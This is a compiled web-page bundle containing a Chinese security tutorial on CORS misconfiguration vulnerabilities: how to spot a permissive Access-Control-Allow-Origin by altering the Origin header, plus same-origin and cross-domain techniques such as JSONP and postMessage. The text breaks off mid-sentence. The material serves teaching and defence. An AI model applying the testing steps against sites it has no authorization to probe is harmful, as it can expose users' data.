"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[209],{7708:(n,s)=>{s.A=(n,s)=>{const a=n.__vccOpts||n;for(const[n,e]of s)a[n]=e;return a}},6149:(n,s,a)=>{a.r(s),a.d(s,{comp:()=>Xn,data:()=>zn});var e=a(4754);const t=a.p+"assets/img/CORS 跨域漏洞-20230824160512-eeedhnh.271e6390.png",p=a.p+"assets/img/CORS 跨域漏洞-1-20230824160512-ia7jnkd.28f4db07.png",o=a.p+"assets/img/CORS 跨域漏洞-2-20230824160512-y4nke9z.00875db4.png",l=a.p+"assets/img/CORS 跨域漏洞-21-20230824160512-69g6ink.472e20f3.png",c=a.p+"assets/img/CORS 跨域漏洞-3-20230824160512-jp89vez.11aa2c38.png",i=a.p+"assets/img/CORS 跨域漏洞-4-20230824160512-rv7jcal.a10c874f.png",r=a.p+"assets/img/CORS 跨域漏洞-5-20230824160512-bql8tmc.1364b739.png",u=a.p+"assets/img/CORS 跨域漏洞-6-20230824160512-4ttmlbj.09958540.png",d=a.p+"assets/img/CORS 跨域漏洞-7-20230824160512-v7vzc99.6a1fdfe1.png",k=a.p+"assets/img/CORS 跨域漏洞-8-20230824160512-j0tpi8g.79d97fca.png",v=a.p+"assets/img/CORS 跨域漏洞-9-20230824160512-mad28n6.cb4ff63d.png",m=a.p+"assets/img/CORS 跨域漏洞-10-20230824160512-peqcmw3.8c81ad24.png",g=a.p+"assets/img/CORS 跨域漏洞-11-20230824160512-5khhpum.48519304.png",h=a.p+"assets/img/CORS 跨域漏洞-12-20230824160512-vosvd3p.10b88648.png",b=a.p+"assets/img/CORS 跨域漏洞-13-20230824160512-ez4igby.769de196.png",w=a.p+"assets/img/CORS 跨域漏洞-14-20230824160512-5p3896n.ecec91d4.png",f=a.p+"assets/img/CORS 跨域漏洞-15-20230824160512-foj5meb.2c1a91c1.png",x=a.p+"assets/img/CORS 跨域漏洞-16-20230824160512-4nilf3a.371ccc5b.png",A=a.p+"assets/img/CORS 跨域漏洞-17-20230824160512-8qdd8w3.09625e29.png",C=a.p+"assets/img/CORS 跨域漏洞-18-20230824160512-yz4f5at.e641944f.png",E=a.p+"assets/img/CORS 跨域漏洞-19-20230824160512-0lnlz6m.12c4f02f.png",y=a.p+"assets/img/CORS 跨域漏洞-20-20230824160512-a02fvyk.9e1fa9ed.png",q=(0,e.Lk)("h1",{id:"_0x01-漏洞描述",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#_0x01-漏洞描述"},[(0,e.Lk)("span",null,"0x01 漏洞描述")])],-1),O=(0,e.Lk)("h2",{id:"概述",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#概述"},[(0,e.Lk)("span",null,"概述")])],-1),S={href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS",target:"_blank",rel:"noopener noreferrer"},R=(0,e.Lk)("p",null,[(0,e.eW)("当 CORS 的设置不正确时，就会带来安全问题；当响应头中的 "),(0,e.Lk)("code",null,"Access-Control-Allow-Origin"),(0,e.eW)("​​ 设置为 "),(0,e.Lk)("code",null,"null"),(0,e.eW)("​​ 或 "),(0,e.Lk)("code",null,"*​​"),(0,e.eW)(" 时，表示信任任何域，这时候就可能引入安全问题。")],-1),T={href:"https://blog.huli.tw/2017/08/27/ajax-and-cors/#:~:text=%E3%80%8C%E4%BD%A0%E7%9A%84%20Request%20%E9%82%84%E6%98%AF%E6%9C%89%E7%99%BC%E5%87%BA%E5%8E%BB%E7%9A%84%E3%80%8D%EF%BC%8C%E8%80%8C%E4%B8%94%E7%80%8F%E8%A6%BD%E5%99%A8%E4%B9%9F%E3%80%8C%E7%A2%BA%E5%AF%A6%E6%9C%89%E6%94%B6%E5%88%B0%20Response%E3%80%8D%EF%BC%8C%E9%87%8D%E9%BB%9E%E6%98%AF%E3%80%8C%E7%80%8F%E8%A6%BD%E5%99%A8%E5%9B%A0%E7%82%BA%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%EF%BC%8C%E4%B8%8D%E6%8A%8A%E7%B5%90%E6%9E%9C%E5%82%B3%E5%9B%9E%E7%B5%A6%E4%BD%A0%E7%9A%84%20JavaScript%E3%80%8D%E3%80%82%E5%A6%82%E6%9E%9C%E6%B2%92%E6%9C%89%E7%80%8F%E8%A6%BD%E5%99%A8%E7%9A%84%E8%A9%B1%E5%85%B6%E5%AF%A6%E5%B0%B1%E6%B2%92%E6%9C%89%E9%80%99%E4%BA%9B%E5%95%8F%E9%A1%8C%EF%BC%8C%E4%BD%A0%E6%84%9B%E7%99%BC%E7%B5%A6%E8%AA%B0%E5%B0%B1%E7%99%BC%E7%B5%A6%E8%AA%B0%EF%BC%8C%E4%B8%8D%E7%AE%A1%E6%80%8E%E6%A8%A3%E9%83%BD%E6%8B%BF%E5%BE%97%E5%88%B0%20Response%E3%80%82",target:"_blank",rel:"noopener noreferrer"},B=(0,e.Lk)("p",null,"當瀏覽器收到 Response 之後，會先檢查 Access-Control-Allow-Origin​​​ 裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。",-1),L=(0,e.Fv)('<p>所以，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js​​​ 对响应资源的操作。【该漏洞的测试误区，要注意同源限制策略是针对浏览器的】</p><figure><img src="'+t+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="测试方法" tabindex="-1"><a class="header-anchor" href="#测试方法"><span>测试方法</span></a></h2><ol><li>测试人员访问某个 url，将请求头中的 Origin 字段修改为任意值，结果仍然能获得正确的响应报文（这会导致误报不应该使用该测试方法），就说明有 CORS 漏洞</li><li>可以通过浏览器的控制台的 network，查看接口的请求包 response 头中 Access-Control-Allow-Origin 是否设置为 <code>*</code>​​</li><li>也可以通过抓包工具，查看接口返回的 response 中是 Access-Control-Allow-Origin 是否设置为 <code>*</code> or null 等其他配置组合，详见下文。​​</li></ol><p><strong>漏洞示例</strong></p><p>配置 Access-Control-Allow-Origin 为 <code>*</code>​​</p><figure><img src="'+p+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>配置 Access-Control-Allow-Origin 但是该值可控</p><figure><img src="'+o+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h1 id="_0x02-同源及跨域" tabindex="-1"><a class="header-anchor" href="#_0x02-同源及跨域"><span>0x02 同源及跨域</span></a></h1><h2 id="什么是同源-跨域" tabindex="-1"><a class="header-anchor" href="#什么是同源-跨域"><span>什么是同源 &amp; 跨域</span></a></h2><p><strong>同源</strong>：协议相同 &amp; 端口相同 &amp; 主机（域名）相同</p><p><strong>跨域</strong>：上述之一不同，如</p><ul><li>网络协议不同，如 http 协议访问 https 协议 ;</li><li>端口不同，如 80 端口访问 8080 端口 ;</li><li>域名不同，如 www.test1.com 访问 www.test2.com ;</li><li>子域名不同，如 abc.test1.com 访问 def.test1.com ;</li></ul><blockquote><p>浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p></blockquote><h2 id="一些应用场景" tabindex="-1"><a class="header-anchor" href="#一些应用场景"><span>一些应用场景</span></a></h2><ul><li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。</li><li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域。</li><li>电商网站想通过用户浏览器加载第三方快递网站的物流信息。</li><li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li></ul><h2 id="跨域的方法" tabindex="-1"><a class="header-anchor" href="#跨域的方法"><span>跨域的方法</span></a></h2>',18),F={href:"https://www.bedefended.com/papers/cors-security-guide",target:"_blank",rel:"noopener noreferrer"},H=(0,e.Lk)("h3",{id:"html-标签",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#html-标签"},[(0,e.Lk)("span",null,"HTML 标签")])],-1),j=(0,e.Lk)("code",null,"<script> <img> <iframe> <link>",-1),P=(0,e.Lk)("code",null,"src",-1),_=(0,e.Lk)("code",null,"src",-1),W=(0,e.Fv)('<p><strong>常见标签</strong></p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>applet</span> <span class="token attr-name">code</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>applet</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>...<span class="token punctuation">&quot;</span></span> <span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 CSS 中，<code>@font-face</code> 可以引入跨域字体。</p><div class="language-css line-numbers-mode" data-ext="css" data-title="css"><pre class="language-css"><code>&lt;style type=<span class="token string">&quot;text/css&quot;</span>&gt;\n    <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>\n        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">&quot;http://developer.mozilla.org/@api/deki/files/2934/=VeraSeBd.ttf&quot;</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n&lt;/style&gt;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="document-domain" tabindex="-1"><a class="header-anchor" href="#document-domain"><span>document.domain</span></a></h3><p>同一主域不同子域之间默认不同源，但可以设置 <code>document.domain</code> 为相同的高级域名来使不同子域同源。</p><p><code>document.domain</code> 只能向上设置更高级的域名，需要载入 iframe 来相互操作。</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token comment">// 父域的运行环境是 http://localhost:9092/</span>\n<span class="token comment">// 同样在部署在同一台服务器上的不同端口的应用也是适用的</span>\n<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">&quot;http://localhost:9093/b.php&quot;</span> id<span class="token operator">=</span><span class="token string">&quot;iframepage&quot;</span> width<span class="token operator">=</span><span class="token string">&quot;100%&quot;</span> height<span class="token operator">=</span><span class="token string">&quot;100%&quot;</span> frameborder<span class="token operator">=</span><span class="token string">&quot;0&quot;</span> scrolling<span class="token operator">=</span><span class="token string">&quot;yes&quot;</span> onLoad<span class="token operator">=</span><span class="token string">&quot;getData&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">&gt;</span>\n\n<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>\n    window<span class="token punctuation">.</span>parentDate <span class="token operator">=</span> <span class="token punctuation">{</span>\n        <span class="token string-property property">&quot;name&quot;</span><span class="token operator">:</span> <span class="token string">&quot;hello world!&quot;</span><span class="token punctuation">,</span>\n        <span class="token string-property property">&quot;age&quot;</span><span class="token operator">:</span> <span class="token number">18</span>\n        <span class="token punctuation">}</span>\n        <span class="token doc-comment comment">/**\n        * 使用 document.domain 解决 iframe 父子模块跨域的问题\n        */</span>\n        <span class="token keyword">let</span> parentDomain <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hostname<span class="token punctuation">;</span>\n        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;domain&quot;</span><span class="token punctuation">,</span>parentDomain<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//localhost</span>\n        document<span class="token punctuation">.</span>domain <span class="token operator">=</span> parentDomain<span class="token punctuation">;</span>\n<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>\n    <span class="token doc-comment comment">/**\n    * 使用 document.domain 解决 iframe 父子模块跨域的问题\n    */</span>\n    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// localhost</span>\n    <span class="token keyword">let</span> childDomain <span class="token operator">=</span> document<span class="token punctuation">.</span>domain<span class="token punctuation">;</span>\n    document<span class="token punctuation">.</span>domain <span class="token operator">=</span> childDomain<span class="token punctuation">;</span>\n    <span class="token keyword">let</span> parentDate <span class="token operator">=</span> top<span class="token punctuation">.</span>parentDate<span class="token punctuation">;</span>\n    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;从父域获取到的数据&quot;</span><span class="token punctuation">,</span>parentDate<span class="token punctuation">)</span><span class="token punctuation">;</span>   \n    <span class="token comment">// 此处打印数据为</span>\n    <span class="token comment">// {</span>\n    <span class="token comment">//     &quot;name&quot;: &quot;hello world!&quot;,</span>\n    <span class="token comment">//     &quot;age&quot;: 18</span>\n    <span class="token comment">// }</span>\n<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="window-name" tabindex="-1"><a class="header-anchor" href="#window-name"><span>window.name</span></a></h3><p><code>window.name</code> 有一个奇妙的性质， 页面如果设置了 <code>window.name</code>，那么在不关闭页面的情况下， 即使进行了页面跳转 <code>location.href=...</code>，这个 <code>window.name</code> 还是会保留。</p><p>利用 <code>window.name</code> 的性质，我们可以在 <code>iframe</code> 中加载一个跨域页面。</p><p>这个页面载入之后，让它设置自己的 window.name​​， 然后再让它进行当前页面的跳转，跳转到与 iframe 外的页面同域的页面，此时 window.name​​ 是不会改变的。</p><p>这样，iframe 内外就属于同一个域了，且 window.name​​ 还是跨域的页面所设置的值。</p><p>假设我们有 3 个页面</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code>a.com/index.html\na.com/empty.html\nb.com/index.html\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>（1）在 <code>a.com/index.html​</code> 页面中嵌入一个 iframe，设置 src 为 <code>b.com/index.html​</code> （2）<code>b.com/index.html​</code> 载入后，设置 window.name​，然后再使用 <code>location.href=&#39;a.com/empty.html&#39;​</code> 跳转到与 iframe 外页面同域的页面中。 （3）在 <code>a.com/index.html​</code> 页面中，就可以通过 <code>$(&#39;iframe&#39;).contentWindow.name​</code> ​来获取 iframe 内页面 <code>a.com/empty.html</code>​ 的 window.name​ ​值了，而这个值正是 <code>b.com/index.html</code> ​设置的。</p><h3 id="window-postmessage" tabindex="-1"><a class="header-anchor" href="#window-postmessage"><span>window.postMessage</span></a></h3><p><code>window.postMessage(message, targetOrgin)</code> 方法是 html5 新引进的特性。 调用 postMessage 方法的 window 对象<strong>是指要接受消息</strong>的哪一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrgin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 <code>*</code>。</p><p>需要接收消息的 window 对象，可是通过监听自身的 message 时间来获取传过来的消息，消息内容存储在该事件对象的 data 属性中。</p><h3 id="location-hash" tabindex="-1"><a class="header-anchor" href="#location-hash"><span>location.hash</span></a></h3><p>location.hash 方式跨域，是子框架具有修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。</p>',22),D=(0,e.Lk)("strong",null,"详细参考",-1),M={href:"https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m4",target:"_blank",rel:"noopener noreferrer"},X=(0,e.Lk)("p",null,[(0,e.Lk)("strong",null,"具体实现步骤"),(0,e.eW)("：一开始 a.html 给 b.html 传一个 hash 值，然后 b.html 收到 hash 值后，再把 hash 值传递给 c.html，最后 c.html 将结果放到 a.html 的 hash 值中。")],-1),z=(0,e.Lk)("figure",null,[(0,e.Lk)("img",{src:l,alt:"",tabindex:"0",loading:"lazy"}),(0,e.Lk)("figcaption")],-1),I=(0,e.Lk)("h3",{id:"flash",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#flash"},[(0,e.Lk)("span",null,"flash")])],-1),N={href:"https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html",target:"_blank",rel:"noopener noreferrer"},U=(0,e.Fv)('<h3 id="json-cors" tabindex="-1"><a class="header-anchor" href="#json-cors"><span>JSON &amp; CORS</span></a></h3><p>JSON with Padding，就是利用 script 标签没有跨域限制的特性，使得网页可以从其他来源域动态获取 Json 数据。JSONP 跨域请求一定需要对方的服务器支持才可以。</p><p>JSONP 实现流程：</p><ol><li>定义一个 回调函数 handleResponse 用来接收返回的数据</li></ol><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</li></ol><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token keyword">var</span> body <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&#39;body&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\n<span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">gerElement</span><span class="token punctuation">(</span><span class="token string">&#39;script&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nscript<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&#39;http://test.com/json?callback=handleResponse&#39;</span><span class="token punctuation">;</span>\nbody<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>',7),G={start:"3"},J=(0,e.Lk)("code",null,"script.src",-1),$={href:"http://test.com/json?callback=handleResponse%EF%BC%8C",target:"_blank",rel:"noopener noreferrer"},V=(0,e.Lk)("li",null,[(0,e.eW)("后端能够识别这样的 URL 格式并处理该请求，然后返回 "),(0,e.Lk)("code",null,'handleResponse({"name": "twosmi1e"})'),(0,e.eW)(" 给浏览器")],-1),K=(0,e.Lk)("li",null,[(0,e.eW)("浏览器在接收到 "),(0,e.Lk)("code",null,'handleResponse({"name": "twosmi1e"})'),(0,e.eW)(" 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。")],-1),Y=(0,e.Lk)("p",null,"CORS 见下文",-1),Z=(0,e.Lk)("h1",{id:"_0x03-cors-详解",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#_0x03-cors-详解"},[(0,e.Lk)("span",null,"0x03 CORS 详解")])],-1),Q=(0,e.Lk)("p",null,'CORS 是一个 W3C 标准，全称是"跨域资源共享"（Cross-origin resource sharing）。CORS 的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。',-1),nn={href:"https://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html",target:"_blank",rel:"noopener noreferrer"},sn={href:"https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html",target:"_blank",rel:"noopener noreferrer"},an=(0,e.Fv)('<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。</p><p><strong>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与</strong>。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。<strong>浏览器一旦发现 AJAX​​ 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</strong></p><p>因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。</p><ul><li>JSONP 只支持 GET​​ 请求，CORS 支持所有类型的 HTTP 请求。</li><li>JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</li></ul><h2 id="cors-工作流程-针对浏览器的" tabindex="-1"><a class="header-anchor" href="#cors-工作流程-针对浏览器的"><span>CORS 工作流程（针对浏览器的）</span></a></h2><ol><li>请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加 Origin 头，用于声明请求方的源。</li><li>资源服务器根据请求中 Origin 头返回访问控制策略(Access-Control-Allow-Origin 响应头)，并在其中声明允许读取响应内容的源。</li><li><strong>浏览器检查</strong>资源服务器在 Access-Control-Allow-Origin 头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。</li></ol><figure><img src="'+c+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="简单请求" tabindex="-1"><a class="header-anchor" href="#简单请求"><span>简单请求</span></a></h2>',8),en={href:"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/CORS#%E7%B0%A1%E5%96%AE%E8%AB%8B%E6%B1%82",target:"_blank",rel:"noopener noreferrer"},tn=(0,e.Fv)('<blockquote><p>（1）请求方法是以下三种方法之一：</p><ul><li>HEAD</li><li>GET</li><li>POST</li></ul><p>（2）HTTP 的头信息不超出以下几种字段：</p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Last-Event-ID</li><li>Content-Type：只限于三个值 application/x-www-form-urlencoded​​、multipart/form-data​​、text/plain​​</li></ul></blockquote><p>这是为了兼容表单（form），因为历史上<strong>表单</strong>一直可以发出跨域请求。AJAX​​ 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。</p><p>凡是<strong>不同时满足</strong>上面两个条件，就属于<strong>非简单请求</strong>。</p><p>浏览器对这两种请求的处理，是不一样的。</p><h3 id="基本流程" tabindex="-1"><a class="header-anchor" href="#基本流程"><span>基本流程</span></a></h3><blockquote><p>对于简单请求，浏览器直接发出 CORS 请求。</p><p>具体来说，就是在头信息之中，增加一个 Origin​​ ​字段。</p></blockquote><p>下面是一个例子，浏览器发现这次跨源 AJAX​​ 请求是简单请求，就自动在头信息之中，添加一个 Origin​​ ​字段。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/cors</span> <span class="token http-version property">HTTP/1.1</span></span>\n<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://api.bob.com</span></span>\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">api.alice.com</span></span>\n<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US</span></span>\n<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>\n<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0...</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面的头信息中，Origin​ ​字段用来说明，本次请求来自哪个源（<code>协议 + 域名 + 端口</code>）。服务器根据这个值，决定是否同意这次请求。</p><p>如果 Origin​​ ​指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 Access-Control-Allow-Origin​​ ​字段（详见下文），就知道出错了，从而抛出一个错误，被 XMLHttpRequest​​ ​的 onerror​​ ​回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。</p><p><strong>如果 Origin​ ​指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</strong></p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://api.bob.com</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Credentials</span><span class="token punctuation">:</span> <span class="token header-value">true</span></span>\n<span class="token header"><span class="token header-name keyword">Access_control-Allow-Method</span><span class="token punctuation">:</span> <span class="token header-value">*</span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Expose-Headers</span><span class="token punctuation">:</span> <span class="token header-value">FooBar</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=utf-8</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以 <code>Access-Control-​</code> ​开头。</p><p>（1）Access-Control-Allow-Origin</p><p>该字段是必须的。它的值要么是请求时 Origin​​ 字段的值，要么是一个 <code>*​​</code> ，表示接受任意域名的请求。</p><p>（2）Access-Control-Allow-Credentials</p><p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie​​。默认情况下，Cookie 不包括在 CORS 请求之中。设为 